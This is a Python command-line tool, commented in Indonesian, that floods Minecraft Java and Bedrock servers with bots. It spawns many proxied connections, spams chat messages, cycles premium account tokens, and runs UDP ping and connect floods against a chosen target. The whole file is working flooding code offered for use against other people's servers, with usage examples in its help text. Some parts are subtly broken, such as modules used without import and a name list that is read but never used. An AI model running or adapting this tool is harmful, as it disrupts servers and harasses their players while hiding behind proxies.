#!/usr/bin/env python3
"""
MC Bot Spammer - Minecraft Java & Bedrock Server Bot Flooder
Multi-threaded bot joiner dengan proxy support dan chat spam
"""

import threading
import time
import random
import string
import json
import argparse
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import modules lokal
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from proxy_scraper import ProxyScraper
from mc_protocol import MCProtocol, generate_bot_names, generate_random_username, MC_PROTOCOL
from bedrock_protocol import BedrockProtocol, BedrockSpammer


class BotSpammer:
    """Minecraft Bot Spammer - Flood server dengan koneksi bot"""
    
    def __init__(self, target_host, target_port=25565, mc_version="1.20.4"):
        self.host = target_host
        self.port = target_port
        self.version = mc_version
        self.protocol_id = MC_PROTOCOL.get(mc_version, 765)
        
        # State
        self.running = False
        self.bots_connected = 0
        self.bots_failed = 0
        self.bots_total = 0
        
        # Proxy
        self.proxies = []
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        
        # Config
        self.join_delay = 0.5       # Delay antar bot join (detik)
        self.chat_messages = []     # Pesan chat untuk spam
        self.chat_delay = 2.0       # Delay antar chat (detik)
        self.use_random_names = True
        self.name_prefix = "Bot"
        self.cracked_mode = True    # Cracked server (tanpa auth)
        
        # Token (untuk premium server)
        self.tokens = []
        self.token_index = 0
        self.token_lock = threading.Lock()
        
        # Stats
        self.stats_lock = threading.Lock()
        self.start_time = None
    
    def load_proxies(self, filepath=None, scrape=False, validate=True):
        """Load atau scrape proxy"""
        scraper = ProxyScraper(timeout=5, max_threads=100)
        
        if filepath and os.path.exists(filepath):
            self.proxies = scraper.load(filepath)
            print(f"[*] Loaded {len(self.proxies)} proxy dari file")
        elif scrape:
            print("[*] Scraping proxy dari internet...")
            scraper.scrape_all()
            if validate:
                scraper.validate_all(test_url=self.host, test_port=self.port)
                self.proxies = scraper.valid_proxies
            else:
                # Convert raw proxies
                for ptype, proxies in scraper.proxies.items():
                    for p in proxies:
                        self.proxies.append({"proxy": p, "type": ptype})
            scraper.save_valid("proxies_valid.txt")
        
        if not self.proxies:
            print("[!] PERINGATAN: Tidak ada proxy, bot akan connect langsung!")
    
    def load_tokens(self, filepath):
        """Load Minecraft tokens dari file"""
        try:
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            self.tokens.append({
                                "username": parts[0],
                                "token": parts[1],
                                "uuid": parts[2] if len(parts) > 2 else None
                            })
            print(f"[*] Loaded {len(self.tokens)} token")
        except Exception as e:
            print(f"[-] Error load token: {e}")
    
    def _get_next_proxy(self):
        """Ambil proxy berikutnya (round-robin)"""
        if not self.proxies:
            return None, None
        
        with self.proxy_lock:
            proxy_data = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy_data.get("proxy"), proxy_data.get("type", "http")
    
    def _get_next_token(self):
        """Ambil token berikutnya"""
        if not self.tokens:
            return None
        
        with self.token_lock:
            token = self.tokens[self.token_index % len(self.tokens)]
            self.token_index += 1
            return token
    
    def _get_bot_name(self, index):
        """Generate nama bot"""
        if self.name_prefix:
            suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
            return f"{self.name_prefix}_{suffix}"
        return generate_random_username(random.randint(5, 12))
    
    def _connect_bot(self, bot_id):
        """Satu bot mencoba connect ke server"""
        import struct as _struct
        import zlib as _zlib
        
        username = self._get_bot_name(bot_id)
        proxy, proxy_type = self._get_next_proxy()
        
        # Untuk premium server, gunakan token
        token_data = None
        if not self.cracked_mode:
            token_data = self._get_next_token()
            if token_data:
                username = token_data["username"]
        
        try:
            mc = MCProtocol(
                self.host, 
                self.port, 
                self.version,
                proxy=proxy, 
                proxy_type=proxy_type
            )
            
            # Connect
            if not mc.connect():
                with self.stats_lock:
                    self.bots_failed += 1
                return False
            
            # Handshake (next_state=2 = Login)
            mc.send_handshake(next_state=2)
            
            # Login Start
            uuid_val = token_data.get("uuid") if token_data else None
            mc.send_login_start(username, uuid_val)
            
            # Handle packets dengan raw socket
            compression = False
            start_time = time.time()
            logged_in = False
            
            while time.time() - start_time < 30:
                try:
                    mc.sock.settimeout(5)
                    
                    # Read packet length
                    length = 0; shift = 0
                    while True:
                        b = mc.sock.recv(1)
                        if not b: raise Exception("closed")
                        byte = b[0]
                        length |= (byte & 0x7F) << shift
                        if (byte & 0x80) == 0: break
                        shift += 7
                    
                    # Read data
                    data = b""
                    while len(data) < length:
                        chunk = mc.sock.recv(length - len(data))
                        if not chunk: raise Exception("closed")
                        data += chunk
                    
                    # Decompress if needed
                    if compression:
                        dlen = 0; pos = 0; shift = 0
                        while data[pos] & 0x80:
                            dlen |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                        dlen |= (data[pos] & 0x7F) << shift; pos += 1
                        if dlen > 0:
                            data = _zlib.decompress(data[pos:])
                        else:
                            data = data[pos:]
                    
                    # Parse packet ID
                    pos = 0; pid = 0; shift = 0
                    while data[pos] & 0x80:
                        pid |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                    pid |= (data[pos] & 0x7F) << shift; pos += 1
                    
                    if pid == 0x00:  # Disconnect
                        slen = 0; shift = 0
                        while data[pos] & 0x80:
                            slen |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                        slen |= (data[pos] & 0x7F) << shift; pos += 1
                        reason = data[pos:pos+slen].decode('utf-8', errors='replace')
                        with self.stats_lock:
                            self.bots_failed += 1
                        mc.disconnect()
                        return False
                    
                    elif pid == 0x02:  # Login Success
                        logged_in = True
                        with self.stats_lock:
                            self.bots_connected += 1
                        print(f"  [+] Bot {username} LOGIN SUCCESS! (Total: {self.bots_connected})")
                        
                        # Stay alive loop
                        self._bot_alive_raw(mc, username, compression)
                        return True
                    
                    elif pid == 0x03:  # Set Compression
                        thr = 0; shift = 0
                        while data[pos] & 0x80:
                            thr |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                        thr |= (data[pos] & 0x7F) << shift
                        compression = True
                    
                    elif pid in [0x1F, 0x23, 0x26, 0x21]:  # Keep Alive
                        try:
                            kid = _struct.unpack('>q', data[pos:pos+8])[0]
                            resp = self._wv(0x15) + _struct.pack('>q', kid)
                            mc.sock.send(self._wv(len(resp)) + resp)
                        except:
                            pass
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if 'closed' in str(e).lower():
                        break
                    continue
            
            # Timeout
            with self.stats_lock:
                self.bots_failed += 1
            mc.disconnect()
            return False
                
        except Exception as e:
            with self.stats_lock:
                self.bots_failed += 1
            return False
    
    def _wv(self, val):
        """Write VarInt helper"""
        out = b""
        while True:
            byte = val & 0x7F; val >>= 7
            if val != 0: byte |= 0x80
            out += struct.pack("B", byte)
            if val == 0: break
        return out
    
    def _bot_alive_raw(self, mc, username, compression):
        """Bot stay alive dengan raw socket"""
        import struct as _struct
        import zlib as _zlib
        
        chat_index = 0
        last_chat = time.time()
        
        while self.running:
            try:
                mc.sock.settimeout(30)
                
                # Read packet
                length = 0; shift = 0
                while True:
                    b = mc.sock.recv(1)
                    if not b: raise Exception("closed")
                    byte = b[0]
                    length |= (byte & 0x7F) << shift
                    if (byte & 0x80) == 0: break
                    shift += 7
                
                data = b""
                while len(data) < length:
                    chunk = mc.sock.recv(length - len(data))
                    if not chunk: raise Exception("closed")
                    data += chunk
                
                # Decompress
                if compression:
                    dlen = 0; pos = 0; shift = 0
                    while data[pos] & 0x80:
                        dlen |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                    dlen |= (data[pos] & 0x7F) << shift; pos += 1
                    if dlen > 0:
                        data = _zlib.decompress(data[pos:])
                    else:
                        data = data[pos:]
                
                # Parse packet ID
                pos = 0; pid = 0; shift = 0
                while data[pos] & 0x80:
                    pid |= (data[pos] & 0x7F) << shift; shift += 7; pos += 1
                pid |= (data[pos] & 0x7F) << shift; pos += 1
                
                # Keep Alive
                if pid in [0x1F, 0x23, 0x26, 0x21]:
                    try:
                        kid = _struct.unpack('>q', data[pos:pos+8])[0]
                        resp = self._wv(0x15) + _struct.pack('>q', kid)
                        mc.sock.send(self._wv(len(resp)) + resp)
                    except:
                        pass
                
                # Chat spam
                if self.chat_messages and time.time() - last_chat > self.chat_delay:
                    msg = self.chat_messages[chat_index % len(self.chat_messages)]
                    msg = msg.replace("{player}", username)
                    msg = msg.replace("{random}", "".join(random.choices(string.ascii_lowercase, k=4)))
                    msg = msg.replace("{count}", str(self.bots_connected))
                    
                    try:
                        # Chat packet (0x03 for 1.21.x)
                        chat_data = self._wv(0x03) + self._ws(msg)
                        mc.sock.send(self._wv(len(chat_data)) + chat_data)
                    except:
                        pass
                    
                    chat_index += 1
                    last_chat = time.time()
                
                # Disconnect packet
                if pid == 0x1A or pid == 0x19 or pid == 0x17 or pid == 0x00:
                    with self.stats_lock:
                        self.bots_connected = max(0, self.bots_connected - 1)
                    break
                    
            except socket.timeout:
                continue
            except Exception as e:
                if 'timed out' not in str(e).lower():
                    break
                continue
        
        try:
            mc.disconnect()
        except:
            pass
        with self.stats_lock:
            self.bots_connected = max(0, self.bots_connected - 1)
    
    def _ws(self, s_val):
        """Write String helper"""
        encoded = s_val.encode("utf-8")
        return self._wv(len(encoded)) + encoded
    
    def _bot_alive_loop(self, mc, username):
        """Bot stay alive - handle keep alive dan chat spam"""
        try:
            chat_index = 0
            last_chat = time.time()
            
            while self.running:
                try:
                    mc.sock.settimeout(30)
                    packet_id, buf = mc.recv_packet()
                    
                    if packet_id is None:
                        continue
                    
                    # Keep Alive (server -> client)
                    if packet_id == 0x26 or packet_id == 0x23 or packet_id == 0x21:
                        # Baca keep alive ID (varies by version)
                        try:
                            keepalive_id = buf.read_long()
                            mc.send_keep_alive(keepalive_id)
                        except:
                            pass
                    
                    # Chat spam
                    if self.chat_messages and time.time() - last_chat > self.chat_delay:
                        msg = self.chat_messages[chat_index % len(self.chat_messages)]
                        msg = msg.replace("{player}", username)
                        msg = msg.replace("{random}", "".join(random.choices(string.ascii_lowercase, k=4)))
                        msg = msg.replace("{count}", str(self.bots_connected))
                        
                        try:
                            mc.send_chat_message(msg)
                        except:
                            pass
                        
                        chat_index += 1
                        last_chat = time.time()
                    
                    # Disconnect packet
                    if packet_id == 0x1A or packet_id == 0x19 or packet_id == 0x17:
                        try:
                            reason = buf.read_string()
                        except:
                            reason = "Unknown"
                        # print(f"  [-] Bot {username} di-kick: {reason[:80]}")
                        with self.stats_lock:
                            self.bots_connected -= 1
                        break
                        
                except Exception as e:
                    if "timed out" in str(e).lower():
                        # Timeout, coba keep alive
                        continue
                    break
                    
        except:
            pass
        finally:
            try:
                mc.disconnect()
            except:
                pass
            with self.stats_lock:
                self.bots_connected = max(0, self.bots_connected - 1)
    
    def start(self, num_bots=10, duration=60):
        """Mulai bot spam"""
        self.running = True
        self.start_time = time.time()
        self.bots_total = num_bots
        
        print(f"\n{'='*60}")
        print(f"  MC BOT SPAMMER")
        print(f"{'='*60}")
        print(f"  Target    : {self.host}:{self.port}")
        print(f"  Version   : {self.version} (protocol {self.protocol_id})")
        print(f"  Bots      : {num_bots}")
        print(f"  Duration  : {duration}s")
        print(f"  Proxy     : {len(self.proxies)} loaded")
        print(f"  Mode      : {'Cracked' if self.cracked_mode else 'Premium'}")
        if self.chat_messages:
            print(f"  Chat Spam : {len(self.chat_messages)} messages")
        print(f"{'='*60}\n")
        
        # Thread untuk monitor
        monitor_thread = threading.Thread(target=self._monitor, args=(duration,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Spawn bots
        with ThreadPoolExecutor(max_workers=min(num_bots, 50)) as executor:
            futures = []
            for i in range(num_bots):
                if not self.running:
                    break
                future = executor.submit(self._connect_bot, i)
                futures.append(future)
                time.sleep(self.join_delay)  # Delay antar join
            
            # Tunggu semua selesai atau timeout
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        self.running = False
        self._print_stats()
    
    def _monitor(self, duration):
        """Monitor stats"""
        while self.running and (time.time() - self.start_time) < duration:
            time.sleep(5)
            elapsed = int(time.time() - self.start_time)
            print(f"\n[*] Stats [{elapsed}s/{duration}s]: "
                  f"Connected: {self.bots_connected} | "
                  f"Failed: {self.bots_failed} | "
                  f"Total: {self.bots_total}")
        
        self.running = False
    
    def _print_stats(self):
        """Print final stats"""
        elapsed = int(time.time() - self.start_time)
        print(f"\n{'='*60}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*60}")
        print(f"  Duration     : {elapsed}s")
        print(f"  Connected    : {self.bots_connected}")
        print(f"  Failed       : {self.bots_failed}")
        print(f"  Total Tried  : {self.bots_total}")
        print(f"  Success Rate : {(self.bots_connected/max(1,self.bots_total))*100:.1f}%")
        print(f"{'='*60}\n")
    
    def stop(self):
        """Stop semua bot"""
        self.running = False
        print("[*] Menghentikan semua bot...")


def main():
    parser = argparse.ArgumentParser(
        description="MC Bot Spammer - Minecraft Java & Bedrock Server Bot Flooder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh penggunaan:
  JAVA:
    %(prog)s -t 192.168.1.100 -n 50
    %(prog)s -t mc.example.com -p 25565 -n 100 --scrape-proxy
    %(prog)s -t mc.example.com -n 20 --chat "Hello!" "GG" "Bot Army!"
    %(prog)s -t mc.example.com --premium --token-file tokens.txt

  BEDROCK:
    %(prog)s -t play.example.com --bedrock --status
    %(prog)s -t play.example.com --bedrock -n 100 --flood ping
    %(prog)s -t play.example.com --bedrock -n 50 --flood connect

Proxy file format:
  socks5://1.2.3.4:1080
  http://5.6.7.8:8080

Token file format (premium mode):
  username:access_token:uuid
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target server IP/hostname")
    parser.add_argument("-p", "--port", type=int, default=None, help="Server port (Java: 25565, Bedrock: 19132)")
    parser.add_argument("-n", "--num-bots", type=int, default=10, help="Jumlah bot (default: 10)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Durasi dalam detik (default: 60)")
    parser.add_argument("-v", "--version", default="1.20.4", help="MC version (default: 1.20.4)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay antar bot join (default: 0.5s)")
    parser.add_argument("--prefix", default="Bot", help="Prefix nama bot (default: Bot)")
    parser.add_argument("--name-file", help="File berisi list nama bot")
    
    # Mode options
    mode_group = parser.add_argument_group("Mode")
    mode_group.add_argument("--bedrock", action="store_true", help="Bedrock mode (UDP/RakNet)")
    mode_group.add_argument("--flood", choices=["ping", "connect", "both"], default="ping",
                           help="Bedrock flood type (default: ping)")
    
    # Proxy options
    proxy_group = parser.add_argument_group("Proxy Options")
    proxy_group.add_argument("--proxy-file", help="File berisi list proxy")
    proxy_group.add_argument("--scrape-proxy", action="store_true", help="Scrape proxy dari internet")
    proxy_group.add_argument("--no-validate", action="store_true", help="Skip proxy validation")
    
    # Auth options
    auth_group = parser.add_argument_group("Authentication")
    auth_group.add_argument("--premium", action="store_true", help="Premium mode (perlu token)")
    auth_group.add_argument("--token-file", help="File berisi MC tokens")
    auth_group.add_argument("--auth", action="store_true", help="Jalankan MS Auth flow")
    
    # Chat options
    chat_group = parser.add_argument_group("Chat Spam")
    chat_group.add_argument("--chat", nargs="+", help="Pesan chat untuk spam")
    chat_group.add_argument("--chat-delay", type=float, default=2.0, help="Delay antar chat (default: 2s)")
    chat_group.add_argument("--chat-file", help="File berisi list chat messages")
    
    # Status check
    parser.add_argument("--status", action="store_true", help="Cek status server saja")
    
    # Threads
    parser.add_argument("--threads", type=int, default=10, help="Jumlah threads (default: 10)")
    
    args = parser.parse_args()
    
    # Set default port berdasarkan mode
    if args.port is None:
        args.port = 19132 if args.bedrock else 25565
    
    # =============================================
    # BEDROCK MODE
    # =============================================
    if args.bedrock:
        print(f"[*] BEDROCK MODE - RakNet Protocol (UDP)")
        
        # Status check
        if args.status:
            bedrock = BedrockProtocol(args.target, args.port)
            result = bedrock.ping()
            
            if "error" not in result:
                print(f"\n[*] Server: {args.target}:{args.port}")
                print(f"    Edition    : {result.get('edition', 'N/A')}")
                print(f"    MOTD       : {result.get('motd', 'N/A')}")
                print(f"    Version    : {result.get('version', 'N/A')}")
                print(f"    Protocol   : {result.get('protocol_version', 'N/A')}")
                print(f"    Players    : {result.get('players_online', 0)}/{result.get('players_max', 0)}")
                print(f"    Game Mode  : {result.get('game_mode', 'N/A')}")
                print(f"    World      : {result.get('world_name', 'N/A')}")
            else:
                print(f"[-] Error: {result['error']}")
            return
        
        # Flood mode
        print(f"[*] Target: {args.target}:{args.port}")
        print(f"[*] Threads: {args.threads}, Packets: {args.num_bots}")
        print(f"[*] Flood type: {args.flood}")
        
        spammer = BedrockSpammer(args.target, args.port)
        
        try:
            if args.flood == "both":
                print("\n[*] Phase 1: Ping Flood...")
                spammer.start(num_threads=args.threads, packets_per_thread=args.num_bots,
                             delay=args.delay, flood_type="ping")
                spammer.running = True
                
                print("\n[*] Phase 2: Connect Flood...")
                spammer.start(num_threads=args.threads, packets_per_thread=args.num_bots,
                             delay=args.delay, flood_type="connect")
            else:
                spammer.start(num_threads=args.threads, packets_per_thread=args.num_bots,
                             delay=args.delay, flood_type=args.flood)
        except KeyboardInterrupt:
            print("\n[*] Ctrl+C terdeteksi, menghentikan...")
            spammer.stop()
        return
    
    # =============================================
    # JAVA MODE
    # =============================================
    
    # Cek status server
    if args.status:
        mc = MCProtocol(args.target, args.port, args.version)
        status = mc.get_server_status()
        if status and "error" not in status:
            print(f"\n[*] Server: {args.target}:{args.port}")
            desc = status.get("description", {})
            if isinstance(desc, dict):
                print(f"    MOTD: {desc.get('text', 'N/A')}")
            else:
                print(f"    MOTD: {desc}")
            ver = status.get("version", {})
            print(f"    Version: {ver.get('name', 'N/A')} (protocol {ver.get('protocol', 'N/A')})")
            players = status.get("players", {})
            print(f"    Players: {players.get('online', 0)}/{players.get('max', 0)}")
            
            # Sample players
            sample = players.get("sample", [])
            if sample:
                print(f"    Online Players:")
                for p in sample[:10]:
                    print(f"      - {p.get('name', 'N/A')}")
        else:
            print(f"[-] Tidak bisa connect ke {args.target}:{args.port}")
            print(f"    Error: {status}")
        return
    
    # MS Auth flow
    if args.auth:
        from mc_auth import MinecraftAuth
        auth = MinecraftAuth()
        token_data = auth.start_device_code_flow()
        if token_data:
            auth.save_token(token_data)
            print(f"[+] Token disimpan! Jalankan bot dengan:")
            print(f"    python {sys.argv[0]} -t {args.target} --premium --token-file mc_token.json")
        return
    
    # Init bot spammer
    spammer = BotSpammer(args.target, args.port, args.version)
    spammer.join_delay = args.delay
    spammer.name_prefix = args.prefix
    spammer.cracked_mode = not args.premium
    spammer.chat_delay = args.chat_delay
    
    # Load chat messages
    if args.chat:
        spammer.chat_messages = args.chat
    elif args.chat_file:
        try:
            with open(args.chat_file, "r") as f:
                spammer.chat_messages = [line.strip() for line in f if line.strip()]
        except:
            print(f"[-] Error load chat file: {args.chat_file}")
    
    # Load proxies
    if args.proxy_file:
        spammer.load_proxies(filepath=args.proxy_file)
    elif args.scrape_proxy:
        spammer.load_proxies(scrape=True, validate=not args.no_validate)
    
    # Load tokens (premium mode)
    if args.premium:
        if args.token_file:
            spammer.load_tokens(args.token_file)
        else:
            print("[-] Premium mode perlu --token-file atau jalankan --auth dulu")
            return
    
    # Load name file
    if args.name_file:
        try:
            with open(args.name_file, "r") as f:
                custom_names = [line.strip() for line in f if line.strip()]
                if custom_names:
                    spammer.name_prefix = None
                    # Will use these names
        except:
            pass
    
    # Start!
    print(f"[*] Memulai bot spam ke {args.target}:{args.port}...")
    print(f"[*] Tekan Ctrl+C untuk stop\n")
    
    try:
        spammer.start(num_bots=args.num_bots, duration=args.duration)
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C terdeteksi, menghentikan...")
        spammer.stop()


if __name__ == "__main__":
    main()
